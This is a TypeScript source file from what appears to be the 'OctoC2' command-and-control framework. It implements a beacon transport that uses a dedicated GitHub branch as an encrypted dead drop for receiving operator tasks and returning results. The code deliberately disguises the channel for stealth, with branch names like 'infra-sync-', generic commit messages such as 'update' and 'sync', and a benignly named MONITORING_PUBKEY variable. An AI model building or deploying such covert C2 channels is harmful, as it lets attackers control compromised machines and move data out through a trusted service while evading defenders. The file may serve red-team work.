/**
 * OctoC2 — BranchTentacle (Tentacle 2 — Branch-based encrypted file drops)
 *
 * Uses a dedicated git branch as a dead-drop channel. Files on the branch
 * serve as dead-drop slots: the server writes an encrypted task blob to a
 * file, the beacon reads and deletes it, then writes an encrypted result
 * blob which the server reads and deletes.
 *
 * Branch layout:
 *   refs/heads/infra-sync-{id8}  — dedicated branch per beacon
 *
 * Files on the branch:
 *   ack.json            — { ts: <iso>, pubkey: <base64url> }
 *   task.json           — encrypted Task[] blob (encryptBox format)
 *   result-{taskId8}.json — sealed TaskResult blob (sealBox format)
 *
 * Commit messages are intentionally generic ("update", "sync") for OPSEC.
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  base64ToBytes,
} from "../crypto/sodium.ts";
import type {
  CheckinPayload,
  Task,
  TaskResult,
  ResultSubmissionOutcome,
} from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
const REF_UPDATE_ATTEMPTS = 3;

function isRefConflict(error: unknown): boolean {
  const status = (error as { status?: number } | null)?.status;
  return status === 409 || status === 422;
}

export class BranchTentacle extends BaseTentacle {
  readonly kind = "branch" as const;

  private lastTaskSha: string | null = null;
  private operatorPublicKey: Uint8Array | null = null;
  private defaultBranch: string | null = null;

  // ── Identity helpers ──────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  /** Full ref name for the dead-drop branch (used with createRef) */
  private get branchRef(): string { return `refs/heads/infra-sync-${this.id8}`; }

  /** Short ref for getRef/updateRef/deleteRef (strips "refs/") */
  private get branchRefShort(): string { return `heads/infra-sync-${this.id8}`; }

  // ── Availability ──────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.getDefaultBranchHeadSha();
      return true;
    } catch {
      return false;
    }
  }

  private async getDefaultBranchHeadSha(): Promise<string> {
    const { owner, name: repo } = this.config.repo;
    if (!this.defaultBranch) {
      const repository = await this.octokit.rest.repos.get({ owner, repo });
      const branch = repository.data.default_branch?.trim();
      if (!branch) {
        throw new Error("BranchTentacle: repository has no default branch");
      }
      this.defaultBranch = branch;
    }
    const ref = await this.octokit.rest.git.getRef({
      owner,
      repo,
      ref: `heads/${this.defaultBranch}`,
    });
    return ref.data.object.sha;
  }

  // ── Operator key resolution ───────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("BranchTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("BranchTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Branch SHA helper ────────────────────────────────────────────────────────

  private async getBranchSha(): Promise<string | null> {
    try {
      const resp = await this.octokit.rest.git.getRef({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        ref:   this.branchRefShort,
      });
      return resp.data.object.sha;
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Write file via git blob+tree+commit+updateRef ────────────────────────────

  private async writeFile(path: string, content: string, message: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    // The blob is immutable and can be reused across optimistic ref retries.
    const blobResp = await this.octokit.rest.git.createBlob({
      owner, repo,
      content,
      encoding: "utf-8",
    });
    const blobSha = blobResp.data.sha;

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const headSha = await this.getBranchSha();
      const baseCommitSha = headSha ?? await this.getDefaultBranchHeadSha();
      const baseCommit = await this.octokit.rest.git.getCommit({
        owner,
        repo,
        commit_sha: baseCommitSha,
      });

      const treeResp = await this.octokit.rest.git.createTree({
        owner, repo,
        base_tree: baseCommit.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  blobSha,
        }],
      });
      const commitResp = await this.octokit.rest.git.createCommit({
        owner, repo,
        message,
        tree: treeResp.data.sha,
        parents: [baseCommitSha],
      });

      try {
        if (headSha) {
          await this.octokit.rest.git.updateRef({
            owner, repo,
            ref:   this.branchRefShort,
            sha:   commitResp.data.sha,
            force: false,
          });
        } else {
          await this.octokit.rest.git.createRef({
            owner, repo,
            ref: this.branchRef,
            sha: commitResp.data.sha,
          });
        }
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  // ── Read file from branch ────────────────────────────────────────────────────

  private async readFile(path: string): Promise<string | null> {
    const { owner, name: repo } = this.config.repo;
    try {
      const resp = await this.octokit.rest.repos.getContent({
        owner, repo,
        path,
        ref: this.branchRef,
      });
      const data = resp.data as any;
      if (data.type !== "file" || !data.content) return null;
      // content is base64-encoded by GitHub API
      return atob(data.content.replace(/\n/g, ""));
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Delete file from branch ──────────────────────────────────────────────────

  private async deleteFile(path: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const headSha = await this.getBranchSha();
      if (!headSha) return;

      const commitResp = await this.octokit.rest.git.getCommit({
        owner, repo, commit_sha: headSha,
      });
      const treeResp = await this.octokit.rest.git.createTree({
        owner, repo,
        base_tree: commitResp.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  null,
        }] as any,
      });
      const newCommit = await this.octokit.rest.git.createCommit({
        owner, repo,
        message: "sync",
        tree:    treeResp.data.sha,
        parents: [headSha],
      });

      try {
        await this.octokit.rest.git.updateRef({
          owner, repo,
          ref:   this.branchRefShort,
          sha:   newCommit.data.sha,
          force: false,
        });
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    if (!payload.identity) {
      throw new Error("BranchTentacle: signed checkin identity is required");
    }

    // 1. Refresh ack.json before every task poll.
    await this.writeFile("ack.json", JSON.stringify(payload), "update");

    const operatorPubKey = await this.getOperatorPublicKey();

    // 2. Poll for task.json
    let taskContent: string | null;
    try {
      taskContent = await this.readFile("task.json");
    } catch {
      return [];
    }

    if (!taskContent || !taskContent.trim()) return [];

    // 3. Decrypt tasks
    let tasks: Task[];
    try {
      const envelope = JSON.parse(taskContent) as { nonce: string; ciphertext: string };

      // Check SHA changed to avoid re-processing same task.json
      // We compare against a hash of the content to detect changes
      const contentSha = await this.getBranchSha();
      if (contentSha && contentSha === this.lastTaskSha) return [];
      this.lastTaskSha = contentSha;

      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 4. Delete task.json (prevents re-delivery)
    try {
      await this.deleteFile("task.json");
      this.lastTaskSha = null;
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    const operatorPubKey = await this.getOperatorPublicKey();

    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    const taskId8 = result.taskId.slice(0, 8);
    await this.writeFile(`result-${taskId8}.json`, sealed, "update");
    return {
      artifactWritten: true,
      controllerAccepted: false,
      channel: "branch",
      acceptance: null,
    };
  }

  // ── Teardown ─────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    // Normal lifecycle teardown must not delete the per-beacon branch: it may
    // still contain result artifacts that the server has not polled yet.
    this.lastTaskSha = null;
    this.operatorPublicKey = null;
    this.defaultBranch = null;
  }
}
